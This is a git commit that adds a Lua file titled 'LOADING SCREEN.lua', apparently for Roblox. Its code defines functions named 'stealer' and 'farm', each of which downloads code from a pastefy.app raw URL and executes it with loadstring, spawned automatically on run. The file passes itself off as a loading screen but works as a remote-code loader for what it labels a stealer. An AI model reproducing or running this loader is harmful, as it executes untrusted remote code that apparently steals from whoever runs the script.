cc03113e20c33a69cfa37e5d1fce313395774e3b
corelibs <ssaint3q3v@gmail.com>
2025-09-06 18:56:43 +0800

    Add files via upload

---
+++ LOADING SCREEN.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet("https://pastefy.app/4yiGY6ZT/raw"))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://pastefy.app/AJxCbwUN/raw"))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
